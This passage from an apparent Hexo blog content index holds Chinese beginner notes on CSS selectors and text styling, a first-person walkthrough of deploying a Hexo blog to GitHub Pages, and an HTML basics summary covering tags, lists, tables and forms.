p3都会显示出这些属性，而p1不会,因为p1没有嵌套在div标签内。 子选择器标签&gt;标签例如：1234567891011121314151617在html中&lt;body&gt;&lt;div&gt;div1 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p&gt;p3&lt;/p&gt; &lt;/li&gt;&lt;/div&gt; &lt;p&gt;p1&lt;/p&gt; &lt;/body&gt;在CSS中div&gt;p&#123; background: green; color: red; font-size: 50px;&#125; 因为p2的父标签是div，所以CSS的属性可以实现，p3,p1的父标签不是,所以不能实现CSS中的属性。 相邻同级选择器例如：1234567891011121314151617在html中&lt;body&gt;&lt;div&gt;div1 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p&gt;p3&lt;/p&gt; &lt;/li&gt;&lt;/div&gt; &lt;p&gt;p1&lt;/p&gt; &lt;/body&gt;在CSS中div+p&#123; background: green; color: red; font-size: 50px;&#125; 可以看到div和 最下面的p标签同级，因此只有p1这个p标签会生效 CSS属性选择器基本选择器【属性】 123456789101112131415161718在html文件中&lt;body&gt; &lt;div&gt;div1 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;p title=\"wo\"&gt;p1&lt;/p&gt;&lt;/body&gt;在CSS文件中P[title=wo]&#123; background: green; color: red; font-size: 50px;&#125; 实现结果：只有p1显示出CSS的属性 属性里面的值可以放多个【属性~=值】代表多个值123456789101112131415161718在html文件中&lt;body&gt; &lt;div&gt;div1 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p title=\"wo2 cc\"&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;p title=\"wo cc\"&gt;p1&lt;/p&gt;&lt;/body&gt;在CSS中P[title~=wo]&#123; background: green; color: red; font-size: 50px;&#125; 只要title包含有wo的就生效。因此只有p1生效 【属性^=值】 开始123456789101112131415161718在html文件中&lt;body&gt; &lt;div&gt;div1 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p title=\"wo2 cc\"&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;p title=\"wo cc\"&gt;p1&lt;/p&gt;&lt;/body&gt;在CSS中P[title^=wo]&#123; background: green; color: red; font-size: 50px;&#125; 实现结果：title的值是以wo开头的，所以p3 p1都会生效 【属性$=值】 结束123456789101112131415161718在html文件中&lt;body&gt; &lt;div&gt;div1 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p title=\"wo2 cc\"&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;p title=\"wo cc\"&gt;p1&lt;/p&gt;&lt;/body&gt;在CSS中P[title$=cc]&#123; background: green; color: red; font-size: 50px;&#125; 实现结果：因为p3 p1 title属性的结尾都是CC，故p3和p1都会实现CSS中的属性 伪元素选择器 不是自己写的HTML文件中自带开始：before结束：after 12345678910111213141516在HTML文件中&lt;body&gt; &lt;p title=\"wo cc\"&gt; &lt;!--&lt;before&gt;--&gt;隐藏的 p1 &lt;!--&lt;after&gt;--&gt; &lt;/p&gt;&lt;/body&gt;在CSS文件中可以改变内容，添加样式p::before &#123; content: \"before\";&#125;p::after &#123; content: \"after\";&#125; 实现的结果为：before p1 after 块元素 第一个字母 first-letter 第一行： first-line 1234567891011在html文件中&lt;body&gt; &lt;p&gt; 这是一段文字 &lt;/p&gt;&lt;/body&gt;在CSS文件中p::first::letter &#123; color: red; font-size: 100px;&#125; 实现结果:第一个字变红放大12345同理p::first::line&#123; color: red; font-size: 100px;&#125; 实现结果:这一段文字变红放大 CSS背景12345在CSS文件中body &#123; background-color: red;//添加背景颜色 background-image: url('图片地址')；//添加背景图片&#125; 实现结果：一个图片是重复铺满整个网页也可以设置平铺的方向1234567body &#123; background-color: red; background-image: url(''); background-repeat: repeat-x//图片沿着X方向平铺 background-repeat: repeat-y//图片沿着T方向平铺 background-repeat: no-repeat;// 只有一张图片，不会进行平铺&#125; 在网页中移动图片12345body &#123; x 轴 y轴 background-position: 100px 100px;也可以表示为 background-position: 50% 0%；&#125; 同样也可以这样12345x轴： left center righty轴： top center bottombody &#123; background-position: center top;&#125; 设置图片不滚动123body &#123; background-attachement: fixed;&#125; 这样背景图片就会保持不动，如果不设置则默认为滚动。 也可以写成这样1background: color image repeat attachment position 按照这样的顺序，就可以节省很多代码量例如：1background: red url('') repeat-y; CSS字体设置字体在CSS文件中 1234567body &#123; font-family: \"黑体\"，\" 宋体\"；//多个字体的话用逗号隔开 font-size: 30px;//设置字体大小，如果不设置系统默认是16px的 font-weight: 100~900//设置字体粗细 &lt;!--一般情况下是不会写数字的，用三个单词代替，分别为normal\\lighter（字号更细）\\bold(字号更粗) font-style: normal;(正常的字体) italic(斜体)&#125; 上面的代码也可以用一行代码进行表示12345678body &#123; font: style weight size/line-height font-family&#125;例如;body &#123; font: italic bold 30px/150px \"微软雅黑\"，\"黑体\"；&#125;line-height：字体的行高 CSS文本设置字符的间距 12345678910&lt;body&gt; &lt;p class=\"txt\"&gt;hello world 这是第一段字&lt;/p&gt;&lt;/body&gt;在CSS文件中.txt &#123; letter-spacing: 0px; &lt;!-- 像素也可以设置为负的--&gt;&#125; 这样就可以设置字符的间距 设置空格的距离1234567891011在html文件中&lt;body&gt; &lt;p class=\"txt\"&gt;hello world 这是第一段字&lt;/p&gt;&lt;/body&gt;在CSS文件中.txt &#123; word-spacing: 0px; &lt;!-- 像素也可以设置为负的--&gt;&#125; 这样就可以设置空格的距离还有一个方法设置字符的间距1direction: ltr; &lt;!--ltr代表的意思即为 left to right--&gt; 在CSS文件中123456 p &#123; text-decoration: line-through; &lt;!--线穿过文字--&gt; overline;&lt;!--线在文字上方--&gt; underline;&lt;!--线在文字下方--&gt;&#125; 例如;123p &#123; text-decoration: line-through;&#125; 文字对齐方式 center(居中对齐) left(左对齐) right(右对齐) justify(两端对齐)默认状态下就是左对齐例如：1234在CSS文件中p &#123; text-align: left;&#125; 这样html文件中p标签的内容便会左对齐 缩进设置123p &#123; text-indent: 60px;&#125; 英语大小写字母设置12345678p &#123; text-transform: uppercase; &lt;!--uppercase是改为全大写--&gt; text-transform: lowercase; &lt;!--lowercase是改为全小写--&gt; text-transform: capitalize; &lt;!--capitalize是改为首字母大写--&gt;&#125;","categories":[],"tags":[]},{"title":"hexo+githup搭建属于自己的博客","slug":"hexo+githup搭建属于自己的博客","date":"2019-03-27T11:53:12.893Z","updated":"2019-06-06T07:25:06.966Z","comments":true,"path":"2019/03/27/hexo+githup搭建属于自己的博客/","link":"","permalink":"http://bealright.github.io/2019/03/27/hexo+githup搭建属于自己的博客/","excerpt":"","text":"hexo+githup搭建属于自己的博客 第一次搭建博客，遇到不少坑。CSDN、bing、谷歌、百度上都有大神的博客教授如何一步一步搭建属于自己的博客。不过我毕竟属于小白，文字有时给我的感受不是那么的直观，所以我是在B站看视频一步一步做的.话说他们的视频都写无坑视频。。。我却遇到了。。。很多坑，但觉得也很有趣，所以记录一下我的搭建过程。 安装node.js 官网链接选择10.15.3LTS进行下载。我是一路next,我开始搭的时候不想放入C盘，但后来发现npm命令不能用😂，才发现还要改路径，很麻烦。所以就一路next放进C盘中去。安装好后，打开cmd 12C:\\Users\\用户名&gt;node -vv10.15.3 即证明已经安装好了。 2 创建github账户 github官网username不要起中文名，起一个英语名字，也不要太过于长，否则都后面会很麻烦。创建完成后点击start a project,创建一个仓库。Repository name 要写成这样的格式username.github.io,例如我用户名创建时bealright.github.io,然后将Initialize this repository with a README前面的对勾打上。点击create repository就创建好了。接下你可以测试一下，点击create new file.,输入index.html，输入&lt;h1&gt; Hello Github &lt;/h1&gt;.然后提交。复制你的链接用户名.github.io，然后转到该页面上去。如果显示出Hello Github，证明你创建的已经成功。如果显示404（所请求的页面不存在或已被删除!），不要着急，我当时被困在这里，毕竟刚开始搭，什么都不懂。在这里一直查怎么回事，删除仓库，重新建库。。。😂😂，到最后我明白了一个真理。。。时间skr伟大的作者，他必将写出最完美的结局 解决方法：问题出在Github服务器上，估计是翻墙什么的缘故吧，会卡一些，你创建的文件不会立即上传过去，要做的就是好好睡一觉明天在搭（因为我是晚上搭的😂），所以遇到这个问题不要着急。 3 安装git for windows git for windows官网因为git for windows是输入外国网站，你必须翻墙去下载，但是速度会特别慢，所以推荐去百度网盘什么的下载，会快一些。我当时找了一个很不错的网址，各种版本的都有。下载地址安装时一路next,我直接放在的C盘中，因为如果出现路径问题会很麻烦，你还得去设置环境变量。在安装的时候，其中有一步要选择Use windows default console window。安装好后打开cmd。输入git 命令。 12345678910111213141516171819202122232425262728293031323334353637383940414243C:\\Users\\赵志豪&gt;gitusage: git [--version] [--help] [-C &lt;path&gt;] [-c name=value] [--exec-path[=&lt;path&gt;]] [--html-path] [--man-path] [--info-path] [-p | --paginate | --no-pager] [--no-replace-objects] [--bare] [--git-dir=&lt;path&gt;] [--work-tree=&lt;path&gt;] [--namespace=&lt;name&gt;] &lt;command&gt; [&lt;args&gt;]These are common Git commands used in various situations:start a working area (see also: git help tutorial) clone Clone a repository into a new directory init Create an empty Git repository or reinitialize an existing onework on the current change (see also: git help everyday) add Add file contents to the index mv Move or rename a file, a directory, or a symlink reset Reset current HEAD to the specified state rm Remove files from the working tree and from the indexexamine the history and state (see also: git help revisions) bisect Use binary search to find the commit that introduced a bug grep Print lines matching a pattern log Show commit logs show Show various types of objects status Show the working tree statusgrow, mark and tweak your common history branch List, create, or delete branches checkout Switch branches or restore working tree files commit Record changes to the repository diff Show changes between commits, commit and working tree, etc merge Join two or more development histories together rebase Reapply commits on top of another base tip tag Create, list, delete or verify a tag object signed with GPGcollaborate (see also: git help workflows) fetch Download objects and refs from another repository pull Fetch from and integrate with another repository or a local branch push Update remote refs along with associated objects'git help -a' and 'git help -g' list available subcommands and someconcept guides. See 'git help &lt;command&gt;' or 'git help &lt;concept&gt;'to read about a specific subcommand or concept. 出现一堆看不懂的就证明已经安装成功了。 4 配置githubSSH 找到下载git fow windows的目录，打开git-bash.exe在命令行输入$ ssh-keygen -t rsa -C &quot;你的邮箱&quot;输入之后，一直按回车就🆗了。等到出现一个长方形框之后，就已经配置好了。然后打开GitHub官网，点击头像，点击Settings,再点击SSH and GOG keys,点击NEW SSH KEY ,这时title就起名为你注册的用户名，然后key需要你找到C:\\Users\\用户名\\.ssh这个目录，注意这里用记事本打开id_rsa.pub,复制里面的代码，粘贴到key上即可。这样就配置好了。 5 hexo本地使用 进入hexo官网注意 这是安装hexo不要在安装到c盘了，因为c盘系统文件太多，不敢乱删，而且找hexo所在文件也不太好找到。我是在D盘建了一个blog文件夹，将hexo安装在这里面。接下来打开cmd 12345C:\\Users\\用户名&gt;D:D:\\&gt;cd blogD:\\blog&gt;npm install hexo-cil -g 首先你得先进入对应的目录，然后输入npm install hexo-cil -g命令即可安装hexo.接下来照着这些命令往下走，第二条命令作用是初始化。最好第二条命令 hexo init 博客名（注册的名字），这样好区分一点。 1INFO start 博客名 with Hexo! 显示出这个时，初始化已完成。 12cd 博客名npm install 待安装好后，本地运行一下，看是否成功。输入1hexo s 显示出 123D:\\blog\\bealright&gt;hexo sINFO Start processingINFO Hexo is running at http://localhost:4000/. Press Ctrl+C to stop. 打开http://localhost:4000/，如果出现这个画面，恭喜创建成功。![在这里插入图片描述](https://github.com/bealright/bealright.github.io/blob/master/photo/7.png?raw=true)因为换了主题的缘故，所以不再是hexo的官方主题，不过只要出现画面就成功了。 六 安装sublime sublime官网下载这个软件有很大用处，无需在记事本了修改配置文件，直接在sublime里修改更方便一些。不过下载这个也要翻墙，所以推荐百度网盘下载。下载好后，找到你安装hexo的目录直接拖进sublime里。就会显示出类似这个的图片。 七 hexo发布到github上 这是最后一步了，看似是胜利女神在向你招手，但你永远也不会知道前面是结束还是会继续掉坑。打开sublime,找到这个然后将最下面的代码改为这样注意： repo里的bealright是我的用户名，改成注册时的用户名就好了。还有一处地方也需要改照这这个格式，把自己的用户名更改了即可（bealright是我自己的用户名）。再打开cmd,输入 123456789hexo gINFO Start processingINFO Files loaded in 124 msINFO Generated: archives/2019/index.htmlINFO Generated: archives/index.htmlINFO Generated: archives/2019/03/index.htmlINFO Generated: index.htmlINFO Generated: 2019/03/16/cmd中操作数据库的那些常见命令/index.htmlINFO 5 files generated in 254 ms 会出现类似的东西（我的创建完成所以会不一样），不要管他。继续输入 1hexo d 此时会出现 1ERROR Deployer not found git 原因在于还少了一个插件到官网下载插件进入hexo文档官网hexo文档官网将命令输入到cmd中即可安装。会有一点慢，等待一会就好。安装好之后，输入 1hexo d 这一步就要看你运气了，我在这里卡了一个晚上 + 一个下午😂。如果出现这个的话恭喜你，运气很好（哈哈），接下只需要输入 12345git config --global user.email \"你的邮件\"回车git config --global user.name \"你的用户名\"再次输入 hexo d会弹出这样的窗口 输入即可进入你的博客了。（好幸运呀）但我遇到的是这样的😤马上就成功了，前面却是这个，好让人心急。不过不要着急，互联网这么强大，大佬那么多，总会有解决方法。冷静下来进行分析。咦，发现问题了。原来是git命令不能用，查了很多文章，我找到了二个解决方法。一：把git for windows 给卸载了重新安装，上文说之所以安装git for windows一路next 不要换路径原因就在这。还有一个就是在这里面输入这里面自带git命令，123重新输入hexo ghexo d 不过让人郁闷的是😱这个git命令解决后。。。还有问题。。。（我要郁闷死😭）同寝室人一个坑没掉过，我一路跌坑。请看新问题。。。我。。。不会吧，又出现这个问题。。。怎么办，都到最后一步了。不放弃继续查，bing\\谷歌\\百度各种查，问学长学姐，加hexo群询问。。。😥不过在耐心快被磨完时，我找到解决方案了。这就是解决方案。当时也不太理解，不过得去尝试，不去尝试怎么知道行不行。首先将删除新建一个文件夹然后下载把下载的内容放在你新建的文件夹里面。再次运行 12hexo ghexo d 当时的心情是快点好吧，大哥求你了😂结果奇迹出现了只不过我的和其他人登陆有点不一样。。。输入的账号，密码全对，结果。。。崩溃的边缘。。。我实在无语，然后输入了自己的用户名bealright（没事的）。。。我遇到的都是事😂突然弹出一个窗口输入密码后，成功了。。。这个过程完成后，感悟真的很多。也许前方无数的bug\\error在等着我，但是只要保持耐心，不断努力，最终会解决他们的。共勉一句我特别喜欢的英语名言No attempt, no success没有尝试，没有成功","categories":[],"tags":[]},{"title":"HTML学习总结","slug":"HTML学习总结","date":"2019-03-27T11:27:20.101Z","updated":"2019-06-06T07:25:16.898Z","comments":true,"path":"2019/03/27/HTML学习总结/","link":"","permalink":"http://bealright.github.io/2019/03/27/HTML学习总结/","excerpt":"","text":"HTML的基本结构1234567891011&lt;!DOCTYPE html&gt;&lt;!--文档类型--&gt;&lt;html lang=\"zh\"&gt;&lt;!--加上lang属性声明语言--&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;!--利用UTF-8格式来解析--&gt;&lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; HTML——文本文本标签 12345&lt;p&gt;段落标签&lt;/p&gt;&lt;h&gt;标题标签&lt;/h&gt;&lt;br&gt;换行标签（单标签）&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;xxx&lt;/p&gt;&lt;!--&amp;nbsp;代表空格--&gt; 文本格式化标签12345&lt;strong&gt;文本加粗标签&lt;/strong&gt;&lt;em&gt;斜体标签&lt;/em&gt;&lt;del&gt;删除标签&lt;/del&gt;&lt;span&gt;&lt;/span&gt;&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;del&gt;phpStudy是一个PHP调试环境的程序集成包&lt;/del&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt; 输出结果：phpStudy是一个PHP调试环境的程序集成包 HTML_图片1234567&lt;img&gt;图像标签&lt;img src=\"\"&gt;&lt;!--src属性放图片--&gt;&lt;img src=\"\" alt=\"\"&gt;&lt;!--alt属性当图片显示不出来时作为可替换文本--&gt;&lt;img src=\"\" alt=\"\" title=\"\"&gt;&lt;!--title属性 点击图片会出现相应的文字--&gt; 图片格式： jpg 有损压缩 影响画质 图片小png 无损压缩 不影响画质 大 有透明通道gif 动图 图片方式： 网络图片 本地图片：相对路径：从当前路径算起的路径 绝对路径：从盘符算起的路径 例如： 相对路径：01.jpg绝对路径：C:\\Users\\用户名\\Pictures\\桌面壁纸\\01.jpg HTML——超链接123456789&lt;a&gt;超链接标签&lt;/a&gt;&lt;a href=\"\" &gt;文本&lt;/a&gt;&lt;!--href属性 填写文件或网页地址--&gt;&lt;a href=\"\" target=\"_balnk\"&gt;文本&lt;/a&gt;&lt;!--target属性保留原来的界面--&gt;&lt;a href=\"\" target=\"_balnk\"&gt; &lt;img src=\"\" alt=\"\"&gt; &lt;!--放图片--&gt;&lt;/a&gt; 例如：1&lt;a href=\"https://www.bilibili.com/\" target=\"_balnk\"&gt;bilibili&lt;/a&gt; 123&lt;a href=\"https://www.bilibili.com/\" target=\"_balnk\"&gt; &lt;img src=\"u=3745332628,2276842928&amp;fm=27&amp;gp=0.jpg\" alt=\"bilibili\"&gt;&lt;/a&gt; 书签标签 锚点1234567&lt;a href=\"#end\"&gt;回到页面最下面&lt;/a&gt;&lt;p&gt;段落&lt;/p&gt;...&lt;p id=end&gt;最后一段段落&lt;/p&gt;&lt;!--直接跳转到最后一个段落--&gt; 如图所示： 图片的映射 shape属性 形状 circle 园 rect 矩形 poly 多边形coords属性 坐标点 例如：1234567&lt;img src=\"2.jpg\" alt=\"\" usemap=\"#bili\"&gt; &lt;map name=\"bili\"&gt;地图 &lt;area shape=\"circle\" coords=\"184,245,100\" href=\"https://www.bilibili.com/\" alt=\"\"&gt;可点击区域 &lt;area shape=\"rect\" coords=\"\" href=\"https://www.bilibili.com/\" alt=\"\"&gt;可点击区域 &lt;/map&gt;&lt;!-- 园coords=“中心坐标，园的半径”--&gt;&lt;!--矩形coords=“左上角点的坐标，右下角点的坐标”--&gt; HTML列表 列表有三类1无序列表：内容列表 ，标签ul+li 无顺序关系2有序列表：内容列表 标签ol+li 有顺序关系3自定义列表： 内容标题+内容 列表 标签dl+dt+dd 例如：12345678&lt;ul&gt;&lt;li&gt;无序列表&lt;/li&gt;&lt;li&gt;无序列表&lt;/li&gt;&lt;li&gt;无序列表&lt;/li&gt;&lt;li&gt;无序列表&lt;/li&gt;&lt;li&gt;无序列表&lt;/li&gt;&lt;li&gt;无序列表&lt;/li&gt;&lt;/ul&gt; 1234567&lt;ol&gt;&lt;li&gt;有序列表&lt;/li&gt;&lt;li&gt;有序列表&lt;/li&gt;&lt;li&gt;有序列表&lt;/li&gt;&lt;li&gt;有序列表&lt;/li&gt;&lt;li&gt;有序列表&lt;/li&gt;&lt;/ol&gt; HTML——表格1234567&lt;table&gt;表格标签&lt;/table&gt;&lt;tr&gt;行标签&lt;/tr&gt;&lt;th&gt;标题标签&lt;/th&gt;&lt;td&gt;内容标签&lt;/td&gt;&lt;table border=\"\"&gt;&lt;td colspan=\"填写需要的列数\"&gt;&lt;/td&gt;&lt;td rowspan=\"填写需要的行数\"&gt;&lt;/td&gt; colspan属性单元格可横跨的列数rowspan属性单元格可横跨的行数border属性加边框 例如：1234567891011121314&lt;table&gt;&lt;tr&gt;&lt;th&gt;班级&lt;/th&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;学号&lt;/th&gt;&lt;th&gt;成绩&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;4&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; 12加边框&lt;table border=\"1\"&gt; 12&lt;td colspan=2&gt;1&lt;/td&gt;&lt;td rowspan=2&gt;2&lt;/td&gt; HTML表单 表单是用来收集用户输入 提交给服务器http: 超文本传输协议 浏览器和服务器的通讯。模式： 请求——应答 浏览器主动发起请求 服务器接收服务器做处理 返回给浏览器 浏览器显示结果。12345&lt;form action=\"\"&gt;表单标签&lt;/form&gt;用户名&lt;input type=\"text\" name=\"自己所取的名字\"&gt;密码&lt;input type=\"password\" name=\"自己设定的密码\"&gt;&lt;!--name属性是告诉浏览器 填入的东西是用户名或密码--&gt;提交按钮&lt;input type=\"submit\"&gt; 例如：12345&lt;form action=\"\"&gt; 用户名&lt;input type=\"text\" name=\"woo\"&gt; 密码&lt;input type=\"password\" name=\"iii\"&gt; &lt;input type=\"submit\"&gt;&lt;/form&gt; 单选框12&lt;input type=\"radio\" name=\"\"&gt;&lt;!--注意名字要保持一致，否则不是一组--&gt; 例如：1234&lt;form action=\"\"&gt; &lt;input type=\"radio\" name=\"sex\"&gt;男 &lt;input type=\"radio\" name=\"sex\"&gt;女&lt;/form&gt; 复选框1&lt;input type=\"checkbox\" name=\"\"&gt; 例如：1234&lt;form action=\"\"&gt; &lt;input type=\"checkbox\" name=\"sex\"&gt;男 &lt;input type=\"checkbox\" name=\"sex\"&gt;女&lt;/form&gt; 下拉框123&lt;select name=\"\"&gt; &lt;option value=\"\"&gt;文本&lt;/option&gt;&lt;/select&gt; 例如：12345678&lt;form action=\"\"&gt;城市：&lt;select name=\"城市\"&gt; &lt;option value=\"\"&gt;武汉&lt;/option&gt; &lt;option value=\"\"&gt;郑州&lt;/option&gt; &lt;option value=\"\"&gt;北京&lt;/option&gt; &lt;option value=\"\"&gt;广州&lt;/option&gt;&lt;/select&gt;&lt;/form&gt; 12345如果提交服务器则需要value属性&lt;input type=\"\" name=\"\" value=\"\"&gt;action属性 提交给网页 可以跳转到该网页&lt;form action=\"\"&gt;&lt;/form&gt; 例如：123456&lt;form action=\"https://www.bilibili.com/\" &gt; 用户名&lt;input type=\"text\" name=\"woo\"&gt; 密码&lt;input type=\"password\" name=\"iii\"&gt; &lt;input type=\"submit\"&gt;&lt;/form&gt;&lt;！--输入用户名和密码后会跳转到指定的网页上--&gt; HTML有两种请求方式 POST GET区别: GET 请求会将get的内容会放在网址里面。 如:![在这里插入图片描述](https://github.com/bealright/bealright.github.io/blob/master/htmlstudyphoto/15.png?raw=true) POST请求会将post的内容放在http的head里面 如： ![在这里插入图片描述](https://github.com/bealright/bealright.github.io/blob/master/htmlstudyphoto/16.png?raw=true) 此时网址不发生任何变化 HTML嵌套规则 块元素：独立成一行 可以设置宽高 默认宽高100% 文字类块元素：12&lt;p&gt;&lt;/p&gt;标签&lt;h&gt;&lt;/h&gt;标签 容器类块元素：12345678910111213标签有：&lt;div&gt;&lt;/div&gt;&lt;table&gt;&lt;/table&gt;&lt;tr&gt;&lt;/tr&gt;&lt;td&gt;&lt;/td&gt;&lt;th&gt;&lt;/th&gt;&lt;form&gt;&lt;/form&gt;&lt;ul&gt;&lt;/ul&gt;&lt;li&gt;&lt;li&gt;&lt;ol&gt;&lt;/ol&gt;&lt;dl&gt;&lt;/dl&gt;&lt;dt&gt;&lt;/dt&gt;&lt;dd&gt;&lt;/dd&gt; 行元素：不独立成一行。12345678标签有：&lt;a&gt;&lt;img&gt;&lt;input&gt;&lt;strong&gt;&lt;em&gt;&lt;del&gt;&lt;span&gt; 特殊元素：12&lt;br&gt;&amp;nbsp; 嵌套规则 一：块元素可以嵌套行元素1&lt;div&gt; &lt;a href=\"\"&gt; &lt;/a&gt; &lt;/div&gt; 二：行元素可以嵌套行元素1&lt;a href=\"\" &gt; &lt;strong&gt; &lt;/strong&gt; &lt;/a&gt; 三：行元素不可以嵌套块元素12&lt;a href=\"\"&gt; &lt;div&gt; &lt;/div&gt; &lt;/a&gt;这个便是错误的 四：文字类块元素不可以嵌套块元素 五：容器类块元素 可以嵌套块元素1&lt;div&gt;&lt;p&gt;&lt;/p&gt;&lt;/div&gt;","categories":[],"tags":[]}]}